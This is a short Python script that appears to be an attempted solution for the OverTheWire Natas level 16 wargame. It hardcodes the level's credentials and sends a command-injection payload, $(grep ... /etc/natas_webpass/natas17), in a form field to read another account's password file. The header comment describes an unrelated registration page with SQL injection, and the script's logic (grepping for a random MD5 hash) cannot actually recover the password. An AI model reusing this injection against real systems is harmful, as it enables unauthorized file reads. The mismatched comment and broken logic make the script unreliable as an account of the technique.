
#
#The code above is a simple registration page that takes in a username and password. The password is hashed using bcrypt and then inserted into the database. The code is vulnerable to SQL injection because the username is not sanitized before being inserted into the database.
#

import requests
import string
import random
import hashlib
import re

url = "http://natas16.natas.labs.overthewire.org/"

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

chars = string.ascii_letters + string.digits

# Generate a random string of length 32
random_string = ''.join(random.choice(chars) for _ in range(32))

# Hash the random string using md5
hash_object = hashlib.md5(random_string.encode())
hex_dig = hash_object.hexdigest()

# Create the payload
payload = {"needle": "anythings$(grep ^" + hex_dig + " /etc/natas_webpass/natas17)"}

# Send the request
response = requests.post(url, auth=(username, password), data=payload)

# Search the response for the password
password = re.findall('<pre>\n(.*)\n</pre>', response.text)[0]

print(password)